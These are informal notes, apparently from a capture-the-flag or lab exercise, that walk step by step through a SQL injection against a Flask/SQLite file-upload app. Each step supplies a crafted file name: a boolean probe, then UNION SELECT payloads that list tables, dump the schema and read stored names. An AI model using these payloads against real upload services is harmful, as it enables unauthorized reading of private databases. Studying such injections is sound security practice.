1. since it uses flask and sqlite, test if it can be used with sqlite injection. by making a file 
* **file name:**
    ```
    test' AND '1'='1.jpg
    ```` 

- if it doesnt say "already exist" when uploaded again. it can be used with SQL injection

2. since its sqlite lets use sqlite syntax:
* **show tables:**
    ```
    test' UNION SELECT name FROM sqlite_master WHERE type='table'--.jpg
    ````
3. we got files table. lets find the data inside it:
* **show table `files` data:**
    ```
    ' UNION SELECT sql FROM sqlite_master WHERE type='table' AND name='files'--.jpg
    ````
4. it returns:
* **after uploading the jpg:**
    ```
    'CREATE TABLE files ( id INTEGER PRIMARY KEY AUTOINCREMENT, original_name TEXT NOT NULL, file_hash TEXT NOT NULL )'
    ````

- now we need to get the original_name:
* **get original name by using offset:**
    ```
    ' UNION SELECT original_name FROM files LIMIT 1 OFFSET 3-- .jpg
    ```
* (note: simply doing this without limit and offset doesnt work. try other numbers too aside from 3)

5. im too tired renaming and uploading filessssssssssss.